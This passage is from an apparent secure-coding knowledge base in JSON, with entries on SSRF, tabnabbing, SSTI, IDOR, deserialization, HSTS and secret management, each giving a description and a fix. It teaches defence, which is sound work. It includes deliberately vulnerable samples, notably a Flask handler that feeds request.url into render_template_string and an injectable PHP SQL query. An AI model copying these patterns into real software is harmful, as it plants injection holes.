alogrithm changes as well.\n"}, {"kb_id": 245, "title": "Screen scraping data harvest", "content": " Description:\n\nWhenever the application does not put a threshold on the number requests made to the server,\nscreen scraping and data harvesting tools can gather data and information.\n\ni.e should the application contain an insecure direct object reference, then the data harvesting\ntool could now harvest information it was not originally authorized to access to.\n\nOr the application is a web shop and the competition is scraping prices and products in order to \ngive them an edge on comparison websites and get more business.\n\n Solution:\n\nModSecurity can be used to set up rules to prevent attackers from scraping and harvesting data\nfrom the application. The ModSecurity can be set up with thresholds and rate limiting and block\nIP adresses if they exceed the threshold.\n"}, {"kb_id": 246, "title": "Communication between components (low privileges)", "content": " Description:\n\nIf accounts for communicating between components have granted more privileges than\nnecessary, these accounts could impose a great threat whenever one of these components gets\ncompromised by attackers. \n\ni.e:\nA web application running on root privileges which has a path traversal vulnerability\ncan be used to read both the \"etc/passwd\" file as well as reading the \"etc/shadow\" file.\n\nThese files can then be used in an offline password cracking attacks to recover accounts\non the server.\n\n Solution:\n\nCommunications between components, such as between the application server and the database \nserver should be authenticated using an account with the least necessary privileges.\n"}, {"kb_id": 247, "title": "TLS settings are in line with current leading practice", "content": " Description:\n\nTLS settings must always be in line with current leading practice. Whenever TLS\nsettings and ciphers get outdated, the TLS connection can be degraded/broken and used by\nattackers to eavesdrop on users traffic over the application.\n\n Solution:\n\nThere should be structural scans that are done regularly against the applications TLS settings\nand configurations to check whether the TLS settings are in line with current leading practice.\n\nThis could be achieved by using the SSLLabs api or the OWASP OSaft project.\n\nOSaft is an easy to use tool to show informations about SSL certificate and tests the SSL \nconnection according to a given list of ciphers and various SSL configurations.\n\nIt''s designed to be used by penetration testers, security auditors or server administrators. \nThe idea is to show the important information or the special checks with a simple call of the tool.\nHowever, it provides a wide range of options so that it can be used for comprehensive and special \nchecks by experienced people.\n\nWhile doing these tests also take into consideration the following configuration on the server\nside:\n\nVerify that old versions of SSL and TLS protocols, algorithms, ciphers, and configuration are \ndisabled, such as SSLv2, SSLv3, or TLS 1.0 and TLS 1.1. The latest version of TLS should be the \npreferred cipher suite.\n\n"}, {"kb_id": 248, "title": "Data retention policy", "content": " Description:\n\nFor all the data gathered in an application, there should be set up a data retention policy\nto make sure all the data is removed from the application when it is no longer used. This reduces\nthe damage done by potential attackers when they get access to the applications data due to a breach.\n\n Solution:\n\nAll the sensitive information within the application must be mapped along with the \ntimeframe it is necessary to store this data on the application. For each data set it\nmust be determined how to effectively clear this information from the application.\n\n"}, {"kb_id": 249, "title": "Authenticated data cleared from client storage", "content": " Description:\n\nAll authenticated data should be removed from the browsers storage as soon as\nthe session is terminated. This reduces the possibility that a potential attacker gains\nsensitive authenticated information whenever the application is attacked.\n\nThis approach also is necessary to disable unauthenticated users to access the information\nif the user was initially logged in on a public computer.\n\n Solution:\n\nWhenever the user terminates his session all sensitive authenticated information should be \ncleared from the browser in the client storage. such as:\n\n* local storage\n* Session storage\n* web SQL\n* Cache storage\n* Application cache\n* etc\n"}, {"kb_id": 250, "title": "All error handling logic must fail securely", "content": " Description:\n\nHandling errors securely is a key aspect of secure coding.\nThere are two types of errors that deserve special attention. The first is exceptions\nthat occur in the processing of a security control itself. It''s important that these\nexceptions do not enable behavior that the countermeasure would normally not allow.\nAs a developer, you should consider that there are generally three possible outcomes\nfrom a security mechanism:\n\n1. Allow the operation\n2. Disallow the operation\n3. Exception\n\nIn general, you should design your security mechanism so that a failure will follow the same execution path\nas disabling the operation\n\n Solution:\n\nMake sure all the error handling logic is thoroughly tested for failing securely before\nusing it in your application. It is common that complete unittest are created especially\nfor this purpose.\n"}, {"kb_id": 251, "title": "Sensitive information in code or online repositories", "content": " Description:\n\nWhenever secrets, API keys, and passwords are stored in the applications source code an attacker\ncan potentially retrieve this sensitive information by i.e:\n\n1. Finding old zip files with earlier releases\n2. Retrieve and read files by path traversal attacks\n\nAlso be cautious not to store this sensitive information on online repositories.\nWhenever this repository gets made public by accident or compromised all this sensitive information\ncan fall into the hands of attackers.\n\n Solution:\n\nVerify that secrets, API keys, and passwords are not included in the source code, or online source code \nrepositories.This could be achieved by manual code reviews and potentially small tools that checks the code\nfor these keys and secrets by means of pattern matching.\n"}, {"kb_id": 252, "title": "Identify all components", "content": " Description:\n\nComponents are defined in terms of the business functions and/or security functions they provide.\nIt is easier for forensics to do their investigations whenever a breach has happened on an application.\n\nThese insights also help whenever an update or release is made on the application to determine what security\nrisks are effectively covered by the security functions. \n\n Solution:\n\nVerify that all application components are defined in terms of the business functions\nand/or security functions they provide.\n"}, {"kb_id": 253, "title": "Display concurrent and active sessions", "content": " Description:\n\nWhenever the user is presented a summary of all concurrent sessions, this decreases a potentially\nsuccesful hijacking attack since the user can now see all sessions and terminate one whenever\nit does not feel trusted.\n\n Solution:\n\nThe user should be presented with all concurrent and active sessions in his profile/account \nsummary. This way the user can keep track of what is happening and can choose to terminate a \nsession whenever it feels untrusted. \n\nWhenever the user shared permission to other applications by means of for example OAuth,\nthan the user should also be presented that have shared permissions along with the type of permissions \nand activation date.\n\n"}, {"kb_id": 254, "title": "Password change leads to destroying concurrent sessions", "content": " Description:\n\nWhenever a user changes his password, the user should be granted the option\nto kill all other concurrent sessions. This countermessure helps to exclude\npotential attackers living on a hijacked session.\n\nNote: Whenever users are granted the possibility to change their passwords,\n      do not forget to make them reauthenticate or to use a form of step up\n      or adaptive authentication mechanism.\n\n Solution:\n\nVerify the user is prompted with the option to terminate all other active sessions \nafter a successful change password process.\n"}, {"kb_id": 255, "title": "HSTS preload", "content": " Description:\n\nHTTP Strict Transport Security (HSTS) is an optin security enhancement that is specified by a \nweb application through the use of a special response header. Once a supported browser receives \nthis header that browser will prevent any communications from being sent over HTTP to the specified \ndomain and will instead send all communications over HTTPS. It also prevents HTTPS click through prompts on browsers.\n\nHowever, there is still a window where a user who has a fresh install, or who wipes out their local state,\nis vulnerable. This is due to the fact that the browser is not yet aware of the fact if the application is trying to connect to supports HSTS. Whenever you are added to the preload list,\nthe application its preference is hardcoded into the browser and all first initial connections will\nalways be made by HTTPS.\n\n Solution:\n\nIn order to request for HSTS preloading, there are some requirements the application has to \nbe complient with. The submission for the HSTS preloading can be performed on the following url:\n\n    https://hstspreload.org/\n\nSubmission Requirements\n\nIf a site sends the preload directive in an HSTS header, it is considered to be requesting \ninclusion in the preload list and may be submitted via the form on this site.\n\nIn order to be accepted to the HSTS preload list the site must satisfy the following set of requirements:\n\n1. Serve a valid certificate.\n2. Redirect from HTTP to HTTPS on the same host, if you are listening on port 80.\n3. Serve all subdomains over HTTPS.\n    In particular, you must support HTTPS for the www subdomain if a DNS record for that subdomain exists.\n5. Serve an HSTS header on the base domain for HTTPS requests:\n    The maxage must be at least eighteen weeks (10886400 seconds).\n    The includeSubDomains directive must be specified.\n    The preload directive must be specified.\n    If you are serving an additional redirect from your HTTPS site, that redirect must still have the HSTS\n     header (rather than the page it redirects to).\n\nNow the following parameter can be added to the HSTS header,\n\nmaintained by Chrome (and used by Firefox and Safari), then use:\n    StrictTransportSecurity: maxage=31536000; includeSubDomains; preload\n\nThe ''preload'' flag indicates the site owner''s consent to have their domain preloaded. The site owner\nstill needs to then go and submit the domain to the list.\n\n CAUTION:\n\nMake sure to have a perfectly smooth certification management. Whenever there is no\nvalid certificate, the application can not be downgraded temporarily over HTTP. The failing of\nthe TLS certificate will lead to a DOS since HSTS does not allow the application to be visited over HTTP\n"}, {"kb_id": 256, "title": "Integrity check and authorised modification", "content": " Description:\n\nThe Current state of the data or program should be compared to the previous recorded in order to detect changes.\nThroughout the development of the application, there must be perpetual checks in place to check if all \npages and resources by default require authentication except those specifically intended to be public.\nSometimes developers simply forget to implement these checks, or they remove the checks temporarily \nfor testing purposes. \n\n Solution:\n\nVerify all access controls are implemented properly in order to prevent a user access data/functions which \nhe was not intended to use.\n"}, {"kb_id": 257, "title": "Unauthorised access and modification", "content": " Description:\n\nThroughout the development of the application there must be perpetual checks in place to check\nif all pages and resources by default require authentication except those specifically intended to be public.\n\nSometimes developers simply forget to implement these checks, or they remove the checks \ntemporarily for testing purposes. \n\n\n Solution:\n\nVerify all access controls are implemented properly in order to prevent a user access data/functions which \nhe was not intended to use.\n"}, {"kb_id": 258, "title": "Identify and use only require functions if using components", "content": " Description:\n\nApplications have many different components that are needed for the business functions \nor for the security functions they provide. With many different components, there are\nalso possible vulnerabilities that can arise. Also, most of the components functions \nthat are delivered are not necessary needed and can introduce a vulnerability in a specific part\nthat may not be even used by the application. Also, these security issues in the components \nare publicly well know and documented. \n\n Solution:\n\nThe best approach in minimizing the possible security issues that can arise in application \ncomponents and identify the required functions and disable or remove those that are not\nneeded by the application business functions or security functions. This way there is a lower risk\nwhen using those components and easier to maintain and protecting the application.\n"}, {"kb_id": 259, "title": "Centralized the mechanisms for protecting resources and the access", "content": " Description:\n\nApplications have often different ways for granting access to protected resources, sometimes these are \ndone based on a role that is defined in a Database or using an Active Directory permission. Also, external\nauthorization services may be implemented and needed for the application. With all these different ways \nfor protecting resources and the access to these assets mistakes will be easily made. \n\n Solution:\n\nImmplement a centralized mechanism where all the different types of resources and grating access to \nthese resources (including libraries that call external authorization services) are located. This way\nit''s easier to maintain and the lower the complexity.\n\nThis centralized solution should also contain sufficient logging and monitoring to detect account abuse or breaches.\n"}, {"kb_id": 260, "title": "Third party components", "content": " Description: \n\nAll third party components the application depends on to operate must be mapped in\nterms of the functions, and/or security functions, they provide for several reasons.\n\n1. Whenever one of these dependencies is down the application has to handle the missing of\n   that dependency gracefully and not break down resulting in a DOS.\n\n2. All security functions they provide must be mapped and backed up by a WAF or ModSecurity in case\n   the dependency goes down for service.\n\n Solution:\n\nVerify that all components that are not part of the application but that the application\nrelies on to operate are defined in terms of the functions, and/or security functions, they provide.\n"}, {"kb_id": 261, "title": "Policy for processing sensitive data", "content": " Description: \n\nSome data on an application can be consider sensitive due to its importance:\n Social security number\n Credit card or banking information\nOr by the context of the information:\n Passphrase used as a password of an application\n University restricted or critical data\n\nOn applications, data considered sensitive should be kept safe. The way we secure the data could be defined by us, but some information it should be made according to a standard  i.e. all applications that manipulate credit card information should comply with one of the pci standards.\n\n\n Solution:\n\nIdentify the list of sensitive data that is being processed by the application.\n\nEstablish, maintain, and disseminate a security policy for processing and storing sensitive data. If information should be encrypted, separated in another database, etc. If exist, follow the appropriate standard.\n"}, {"kb_id": 262, "title": "Server side request forgery", "content": " Description:\n\nServer Side Request Forgery (SSRF) attack, where an attacker abuse the functionality of a\nvulnerable web application to send crafter request which which read or update internal \nresources. Attacker can attack an internal network or application behind the firewall with\nthis attack which is normally not accessible through external network and even attack the\ninternal network web applications.\n\nSSRF attack can be used to make requests to other internal resources for accessing the \nmetadata and to run a port can on the internal network. URL schema such as file:// can\nbe used to read the file from the server. Attackers can use legacy URL schemas such as \ndict, gopher, expect etc which can even cause remote code execution.\n\n Solution:\n\nDisable unused URL schemas which are dangerous like expect://, file:///, ftp://, gopher://.\nProper whitelisting of domain or IP address which you need to access to. Response received from \nthe internal server should not be shown to the attacker. Some services like Memcached, Redis, Elasticsearch and MongoDB do not require authentication by default, so we need to enable \nauthentication for these services.\n"}, {"kb_id": 263, "title": "ASVS", "content": " Description:\n\nThe OWASP Application Security Verification Standard (ASVS) Project provides a basis for testing web application technical security controls and also provides developers with a list of requirements for secure development.\n\nThe primary aim of the OWASP Application Security Verification Standard (ASVS) Project is to normalize the range in the coverage and level of rigor available in the market when it comes to performing Web application security verification using a commerciallyworkable open standard. The standard provides a basis for testing application technical security controls, as well as any technical security controls in the environment, that are relied on to protect against vulnerabilities such as CrossSite Scripting (XSS) and SQL injection. This standard can be used to establish a level of confidence in the security of Web applications. The requirements were developed with the following objectives in mind:\n\nUse as a metric  Provide application developers and application owners with a yardstick with which to assess the degree of trust that can be placed in their Web applications,\nUse as guidance  Provide guidance to security control developers as to what to build into security controls in order to satisfy application security requirements, and\nUse during procurement  Provide a basis for specifying application security verification requirements in contracts.\n\n Solution:\n\nCheck out the OWASPASVS checklist in the OWASPSKF application or download the PDF version of ASVS here:\nhttps://www.owasp.org/images/3/33/OWASP_Application_Security_Verification_Standard_3.0.1.pdf\n"}, {"kb_id": 264, "title": "MASVS", "content": " Description:\n\n\nThe OWASP Mobile App Security and Verification (MASVS) Project provides a basis for testing mobile application technical security controls and also provides developers with a list of requirements for secure development. It can be used by mobile software architects and developers seeking to develop secure mobile applications, as well as security testers to ensure completeness and consistency of test results. \n\nThe requirements were developed with the following objectives in mind:\n\nUse as a metric  Provide developers and application owners with a yardstick with which to assess the degree of trust that can be placed in their mobile applications,\nUse as guidance  Provide guidance to security control developers as to what to build into security controls in order to satisfy application security requirements, and\nUse during procurement  Provide a basis for specifying application security verification requirements in contracts.\n\n Solution:\n\nCheck out the OWASPMASVS checklist in the OWASPSKF application or download the PDF version of MASVS here:\nhttps://github.com/OWASP/owaspmasvs/releases/download/1.0/OWASP_Mobile_AppSec_Verification_Standard_v1.0.pdf\n"}, {"kb_id": 265, "title": "PCI DSS", "content": " Description:\n\n\nThe Payment Card Industry Data Security Standard (PCI DSS) applies to companies of any size that accept credit card payments. If your company intends to accept card payment, and store, process and transmit cardholder data, you need to host your data securely with a PCI compliant hosting provider.\nPCI DSS 12 requirements is a set of security controls that businesses are required to implement to protect credit card data and comply with the Payment Card Industry Data Security Standard (PCI DSS). The requirements were developed and are maintained by the Payment Card Industry (PCI) Security Standards Council.\n\n\n Solution:\n\nCheck out the PCIDSS requirements here:\nhttps://www.pcisecuritystandards.org/document_library?category=pcidss&document=pci_dss\n"}, {"kb_id": 266, "title": "Tabnabbing", "content": " Description:\n\nReverse tabnabbing is an attack where a page linked from the target page is able to rewrite that page, \nfor example to replace it with a phishing site. As the user was originally on the correct page they are \nless likely to notice that it has been changed to a phishing site, especially it the site looks the same as the target. \nIf the user authenticates to this new page then their credentials (or other sensitive data) are sent to the phishing site rather than the legitimate one.\n\nAs well as the target site being able to overwrite the target page, any http link can be spoofed to overwrite the target \npage if the user is on an unsecured network, for example a public wifi hotspot. The attack is possible even if the target \nsite is only available via https as the attacker only needs to spoof the http site that is being linked to.\n\n Solution:\n\nTo prevent this issue the following actions are available:\n\nCut the back link between the parent and the child pages:\n  For html link:\n   * To cut this back link then add the attribute rel=\"noopener\" on the \n     tag used to create the link from the parent page to the child page. \n     This attribute value cut the link but, depending on the browser, let referrer\n     information be present in the request to the child page.\n   * To remove also the referrer information then use this attribute value: rel=\"noopener noreferrer\".\n  For javascript window.open function, add the values noopener,noreferrer in the windowFeatures parameter of the window.open function.\n\nAs the behavior using the elements above is different between the browsers either using html \nlink or javascript to open a window (or tab) then use this configuration to maximize the cross supports:\n\n* For html link, add the attribute rel=\"noopener noreferrer\" for every links.\n* For Javascript, use this function to open a window (or tab):\n\n  function openPopup(url, name, windowFeatures){\n    //Open the popup and set the opener and referrer policy instruction\n    var newWindow = window.open(url, name, ''noopener,noreferrer,'' + windowFeatures);\n    //Reset the opener link\n    newWindow.opener = null;\n  }\n  \nAdd the HTTP response header ReferrerPolicy: noreferrer the every HTTP responses send by the application\n(Header ReferrerPolicy information). This configuration will ensure that no referrer information is sent along with requests from page.\n"}, {"kb_id": 267, "title": "Server side template injection", "content": " Description:\n\nWhenever user supplied input is embeded directly into a template when the application\nmakes use of a templeating engine (jinja2, twig, Freemarker), a malicious attacker can inject \nand execute template expressions. More often the injection of template expressions will ultimately \nlead to RCE vulnerabilities.\n\nThis type of vulnerability is also seen a lot through applications that let the user intentionally\nmodify the template to provide users a more flexible way to style the applications pages like\na wiki page or CMS system.\n\n Solution:\n\nUser supplied input should never be used directly into a template that uses a templating engine.\nThe following example is a small python flask function that renders user supplied input \nas part of the template. This allows a malicious attacker to even execute arbitrary commands when.\n\n```\n  @app.errorhandler(404)\n  def page_not_found(e):\n      template = \"\"\"\n  <html>\n  <p>{0}</p>\n  </html>\n\n  \"\"\".format(request.url)\n      return render_template_string(template), 404\n```\n\nThe prefered way to add the user supplied input to this template would be:\n```\n  @app.errorhandler(404)\n  def page_not_found(e):\n    input = request.url\n    return render_template(\"errorpage.html\", input = input), 404\n```    \n\nWheras the content of the errorpage.html would look like\n\n```\n  <html>\n      <p>{{input}}</p>\n  </html>\n```\n"}, {"kb_id": 268, "title": "Insecure direct object references", "content": " Description:\n\nApplications frequently use the actual name or key of an object when generating web pages. \nApplications don\u2019t always verify the user is authorized for the target object. \nThis results in an insecure direct object reference flaw. Testers can easily manipulate parameter \nvalues to detect such flaws and code analysis quickly shows whether authorization is properly verified.\n\nThe most classic example:\nThe application uses unverified data in a SQL call that is accessing account information:\n\nString query = \"SELECT * FROM accts WHERE account = ?\";\nPreparedStatement pstmt = connection.prepareStatement(query , ... );\npstmt.setString( 1, request.getParameter(\"acct\"));\nResultSet results = pstmt.executeQuery();\n\nThe attacker simply modifies the \u2018acct\u2019 parameter in their browser to send whatever \naccount number they want. If not verified, the attacker can access any user\u2019s account, instead of \nonly the intended customer\u2019s account.\n\nhttp://example.com/app/accountInfo?acct=notmyacct\n\n Solution:\n\nPreventing insecure direct object references requires selecting an approach \nfor protecting each user accessible object (e.g., object number, filename):\n\nUse per user or session indirect object references. This prevents attackers from directly \ntargeting unauthorized resources. For example, instead of using the resource\u2019s database key, \na drop down list of six resources authorized for the current user could use the numbers 1 to 6 to \nindicate which value the user selected. The application has to map the peruser indirect reference \nback to the actual database key on the server.\n\nCheck access. Each use of a direct object reference from an untrusted source must include an access control \ncheck to ensure the user is authorized for the requested object.\n"}, {"kb_id": 269, "title": "Type checking and length checking", "content": " Description:\n\nType checking, length checking and whitelisting is an essential in defense in depth strategie to make\nyour application more resiliant against input injection attacks.\n\nExample:\n    ```\n    SELECT * FROM pages WHERE id=mysql_real_escape_string($_GET[''id''])\n    ```\n    \nThis PHP example did effectively not mitigate the SQL injection. This was due to the fact\nthat it only escaped string based SQL injection. \n\nNow, if this application also had additional checks to validate if the value of \nthe $_GET[''id''] parameter was indeed as expected an integer and rejected if this condition was false, \nthe attack would effectively been mitigated.\n\n\n Solution:\n\nAll the user supplied input that works outside of the intended opteration of the application\nshould be rejected by the application.\n\nSyntax and Semantic Validity\nAn application should check that data is both syntactically and semantically \nvalid (in that order) before using it in any way (including displaying it back to the user). \n\nSyntax validity, means that the data is in the form that is expected. For example, an application\nmay allow a user to select a fourdigit \u201caccount ID\u201d to perform some kind of operation. \nThe application should assume the user is entering a SQL injection payload, and should \ncheck that the data entered by the user is exactly four digits in length, and consists only of numbers \n(in addition to utilizing proper query parameterization).\n\nSemantic validity, includes only accepting input that is within an acceptable range for the\ngiven application functionality and context. For example, a start date must be before an end\ndate when choosing date ranges.\n\n"}, {"kb_id": 270, "title": "SMTP IMAP injection", "content": " Description:\n\nThis threat affects all applications that communicate with mail servers (IMAP/SMTP), generally webmail applications. The aim of this test is to verify the capacity to inject arbitrary IMAP/SMTP commands into the mail servers, due to input data not being properly sanitized.\n\nThe IMAP/SMTP Injection technique is more effective if the mail server is not directly accessible from Internet. Where full communication with the backend mail server is possible, it is recommended to conduct direct testing.\n\nAn IMAP/SMTP Injection makes it possible to access a mail server which otherwise would not be directly accessible from the Internet. In some cases, these internal systems do not have the same level of infrastructure security and hardening that is applied to the frontend web servers. Therefore, mail server results may be more vulnerable to attacks by end users.\n\n Solution:\n\nLimit the available IMAP/SMTP commands to the ones that are really needed. Also make sure you make it not publicly available when there is no need for this."}, {"kb_id": 271, "title": "Insecure object deserialization", "content": " Description:\n\nSerialization is the process of turning some object into a data format that can be restored later. \nPeople often serialize objects in order to save them to storage, or to send as part of communications.\n\nDeserialization is the reverse of that process, taking data structured from some format, and rebuilding it\ninto an object. Today, the most popular data format for serializing data is JSON. Before that, it was XML.\n\nHowever, many programming languages offer a native capability for serializing objects. These native formats\nusually offer more features than JSON or XML, including customizability of the serialization process.\n\nUnfortunately, the features of these native deserialization mechanisms can be repurposed for malicious\neffect when operating on untrusted data. Attacks against deserializers have been found to allow denialofservice,\naccess control, and remote code execution (RCE) attacks.\n\n\n Solution:\n\nVerify that serialized objects use integrity checks or are encrypted to prevent hostile object creation or data tampering.\n\nA great reduction of risk is achieved by avoiding native (de)serialization formats. By switching to a \npure data format like JSON or XML, you lessen the chance of custom deserialization logic being repurposed \ntowards malicious ends.\n\nMany applications rely on a datatransfer object pattern that involves creating a separate domain of \nobjects for the explicit purpose data transfer. Of course, it''s still possible that the application \nwill make security mistakes after a pure data object is parsed.\n\nIf the application knows before deserialization which messages will need to be processed, \nthey could sign them as part of the serialization process. The application could then to \nchoose not to deserialize any message which didn''t have an authenticated signature.\n"}, {"kb_id": 272, "title": "Software security development lifecycle", "content": " Description:\n\nIn software engineering, a software development process is the process of dividing software development\nwork into distinct phases to improve design, product management, and project management. \nIt is also known as a software development life cycle. The methodology may include the \npredefinition of specific deliverables and artifacts that are created and completed by a \nproject team to develop or maintain an application\n\nIn this software security development lifecycle we can also integrate security test automation and\nother quality pilars for security.\n\n Solution:\n\nThe secure software development lifecycle ideally consists out of 5 different stages namely:\n\n* Training and awareness\n* Security requirements\n* Test automation (unit testing, sonarqube, e2e testing, etc)\n* Security test automation (SAST, DAST, IAST, RASP, ETC)\n* Secure code review, penetration test\n\nThere are a lot of ways to achieve a good (S)SDLC, the most important thing to keep into\nconsideration is that you need to have a scalable solution that works over different CI\nenvorinments. Also keep in mind that your CI/CD pipeline is a production environment that\ndelivers production environments. So your CI/CD pipelines should be hardened as well as any other \napplication.  Keep into consideration things like\n\n Monitoring on your pipeline\n Secret management\n Hardening of containers\n Hardening of your CI environment\n etc\n"}, {"kb_id": 273, "title": "Functional security constraints", "content": " Description:\n\nFunctional security constraints help your software developers determine the level of\ngrants/authorizations the users have over the application. \n\n Solution:\n\nVerify that all user stories and features contain functional security constraints, such as \n\"As a user, I should be able to view and edit my profile. I should not be able to view or edit anyone else''s profile\"\n"}, {"kb_id": 274, "title": "Attribute based authorization", "content": " Description:\n\nAccess Control (or Authorization) is the process of granting or denying specific requests from a user, \nprogram, or process. Access control also involves the act of granting and revoking those privileges.\n\nIt should be noted that authorization (verifying access to specific features or resources) is not equivalent\nto authentication (verifying identity).  \n\n Solution:\n\nAttribute Based Access Control (ABAC) will grant or deny user requests based on arbitrary \nattributes of the user and arbitrary attributes of the object, and environment conditions \nthat may be globally recognized and more relevant to the policies at hand. \n\nOnce you have chosen a specific access control design pattern, it is often difficult and time\nconsuming to reengineer access control in your application with a new pattern. Access Control is\none of the main areas of application security design that must be thoroughly designed up front, \nespecially when addressing requirements like multitenancy and horizontal (data dependent) access control. \n\n\nIdeally we want to move from here:\n```\nif (user.hasRole(\"ADMIN\")) || (user.hasRole(\"MANAGER\")) {\n   deleteAccount();\n}\n```\n\nTo here:\n\n```\nif (user.hasAccess(\"DELETE_ACCOUNT\")) {\n   deleteAccount();\n}\n```\n\nThis is becuase the latter is more manageble over time.\n\nFor more information please refer to the OWASP top 10 pro active controls.\n\nhttps://www.owasp.org/index.php/OWASP_Proactive_Controls\n\nOWASP pro active controls chapter C7 \"Enforce Access Controls\"\n\n"}, {"kb_id": 275, "title": "Key management and key lifecycle by NIST", "content": " Description:\n\nThis knowledgebase item refers to the NIST standard for key managment and\nkey lifecycle.\n\nThis Recommendation provides cryptographic key management guidance. It consists of\nthree parts. Part 1 provides general guidance and best practices for the management of\ncryptographic keying material. Part 2 provides guidance on policy and security planning\nrequirements for U.S. government agencies. Finally, Part 3 provides guidance when using\nthe cryptographic features of current systems. \n\n Solution:\n\nPlease refer to the following documentation for more indepth information:\n\nhttps://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.80057pt1r4.pdf\n"}, {"kb_id": 276, "title": "Key vault", "content": " Description:\n\nKeys should remain in a protected key vault at all times. \nIn particular, ensure that there is a gap between the threat vectors \nthat have direct access to the data and the threat vectors that have direct access to the keys. \nThis implies that keys should not be stored on the application or web server \n(assuming that application attackers are part of the relevant threat model).\n\nA key vault helps secure, store and tightly control access to tokens, passwords, certificates and,\nencryption keys for protecting secrets and other sensitive data.  \n\nImagine the use of a keyvault in the following scenario''s\n\n* Running a docker container and provisioning it with secrets over CLI\n* Checking in API keys in your source repositories\n* Encrypting sensitive data at rest\n\nVault provides encryption as a service with centralized key management to simplify encrypting data \nin transit and at rest across clouds and datacenters.\n\na Vault can be used to encrypt/decrypt data that is stored elsewhere. The primary use of this is to allow applications to encrypt their data while still storing it in the primary data store.\n\nThe benefit of this is that developers do not need to worry about how to properly encrypt data. The responsibility of encryption is on Vault and the security team managing it, and developers just encrypt/decrypt data as needed.\n\n Solution:\n\ncentrally store, access, and distribute secrets like API keys,\nAWS IAM/STS credentials, SQL/NoSQL databases, X.509 certificates, \nSSH credentials, etc by means of a key vault.\n\nWhen selecting a key vault that is fit for your needs make sure it has Cryptographic Compliance\ntowards the FIPS standards.\n\n\n"}, {"kb_id": 277, "title": "Secrets shared with the client", "content": " Description:\n\nsymmetric keys, passwords, or API secrets that are shared with the client should\nnot be used for functions that are classified critical.\n\nWhenever a client is sucessfully targeted by a malicious attacker the integrety\nof these keys is no longer guaranteed. \n\n Solution:\n\nVerify that symmetric keys, passwords, or API secrets generated\nby or shared with clients are used only in protecting low risk secrets, \nsuch as encrypting local storage, or temporary ephemeral uses such as parameter obfuscation.\nSharing secrets with clients is cleartext equivalent and architecturally should be treated as such.\n"}, {"kb_id": 278, "title": "Data protection levels", "content": " Description:\n\nThe CIA triad of confidentiality, integrity, and availability is at the heart of information security.\n\nConfidentiality\nIn information security, confidentiality \"is the property, that information\nis not made available or disclosed to unauthorized individuals, entities, or processes.\" \nWhile similar to \"privacy,\" the two words aren''t interchangeable. Rather, confidentiality \nis a component of privacy that implements to protect our data from unauthorized viewers.\nExamples of confidentiality of electronic data being compromised include laptop theft, \npassword theft, or sensitive emails being sent to the incorrect individuals.\n\nIntegrity\nIn information security, data integrity means maintaining and assuring the accuracy\nand completeness of data over its entire lifecycle. This means that data cannot\nbe modified in an unauthorized or undetected manner. This is not the same thing as\nreferential integrity in databases, although it can be viewed as a special case of\nconsistency as understood in the classic ACID model of transaction processing.\nInformation security systems typically provide message integrity along side to confidentiality.\n\nAvailability\nFor any information system to serve its purpose, the information must be available when it is needed.\nThis means the computing systems used to store and process the information, \nthe security controls used to protect it, and the communication channels used to\naccess it must be functioning correctly. High availability systems aim to remain available\nat all times, preventing service disruptions due to power outages, hardware failures, \nand system upgrades. Ensuring availability also involves preventing denialofservice attacks, \nsuch as a flood of incoming messages to the target system, essentially forcing it to shut down.\n\n\n Solution:\n\nBased on CIA determine a protection level and define countermessures that belong to that specific \nprotection level such as but not limited to.\n\n encryption requirements\n integrity requirements \n retention\n privacy \n\nand other confidentiality requirements, and that these are applied in the architecture.\n"}, {"kb_id": 279, "title": "Source control systems in place", "content": " Description:\n\nA component of software configuration management, version control, also known\nas revision control or source control, is the management of changes to documents,\ncomputer programs, large web sites, and other collections of information.\nChanges are usually identified by a number or letter code, termed the \"revision number\",\n\"revision level\", or simply \"revision\". For example, an initial set of files\nis \"revision 1\". When the first change is made, the resulting set is \"revision 2\",\nand so on. Each revision is associated with a timestamp and the person making the\nchange. Revisions can be compared, restored, and with some types of files, merged.\n\nBenefits of source control for security are amongst others,\n Restoring Previous Versions\n Understanding What Happened\n Backup\n Easy to Review code\n Fundemental for CI/CD integrations\n\n Solution:\n\nVerify that a source code control system is in use, with procedures to\nensure that checkins are accompanied by issues or change tickets. \nThe source code control system should have access control and \nidentifiable users to allow traceability of any changes.\n"}, {"kb_id": 280, "title": "Continuous security testing", "content": " Description:\n\nWe want to test our applications and infrastructure for out of date and\ninsecure components and services that are running periodically. \n\nWe can configure our CI environment in such a way that we have\njobs running that do automated continuous (hourly, daily, weekly, monthly)\nsecurity scanning on our infrastructure and applications. \n\n Solution:\n\nIntegrate security tooling into your CI/CD pipelines that do\ncontinuous security scanning against your applications and infrastructure\nsuch as but not limited to the following tools,\n\n* Nessus\n* OpenVas\n* Nmap\n* Nikto\n* OWASP Zap (passive scans)\n\nThese tools should than run periodically to scan your system for known\nvulnerabilities and report high/critical findings to your engineers so\nthey can take appropriate actions.\n"}, {"kb_id": 281, "title": "Security test automation", "content": " Description:\n\nSecurity tools can be easiliy integrated into CI/CD pipelines.\nGenerally the recommended way is to containerize your tooling to\nhave a CI environment agnostic approach so you can build and configure them\nonce and than run them everywhere you need. Especially with autonomous \nself steering developer teams this is a really important development.\n\nThere are a lot of security tools on the market both free\nand premium. It is for you to decide which tools cover your technology\nstacks most optimal.\n\nThere are different category tooling such as but not limited to,\n\n DAST tools\n  Web Application Vulnerability Scanners are automated tools that scan\n  web applications, normally from the outside, to look for security\n  vulnerabilities such as Crosssite scripting, SQL Injection, \n  Command Injection, Path Traversal and insecure server configuration. \n  This category of tools is frequently referred to as Dynamic Application \n  ecurity Testing (DAST) Tools.  \n\n SAST tools\n  Source code analysis tools, also referred to as Static \n  Application Security Testing (SAST) Tools, are designed to \n  analyze source code and/or compiled versions of code to help \n  find security flaws.  \n\n Dependency checker tools\n   up to 90 percent of an application typically consists of thirdparty components.\n   A depdendenct checker builds up the applications dependency tree and correlates\n   all the third party components to known vulnerabilities to see if\n   by using these libraries, you are introducing vulnerable components in your \n   application. Some Source code repositories provide dependency checking out\n   of the box these days.\n\n Solution:\n\nExamples for SAST tooling are found here, allong with more in depth\ninformation.\n\n    https://www.owasp.org/index.php/Source_Code_Analysis_Tools\n\nExamples for DAST tooling are found here,\n\n    https://www.owasp.org/index.php/Category:Vulnerability_Scanning_Tools\n\n\nExamples for tools that can scan your containers for vulnerbilities are,\n\n    https://coreos.com/clair/docs/latest/\n    https://anchore.com/\n\nExamples for Dependency checkers are found here,\n    https://www.owasp.org/index.php/OWASP_Dependency_Check\n"}, {"kb_id": 282, "title": "Referrer policy header", "content": " Description:\nRequests made from a document, 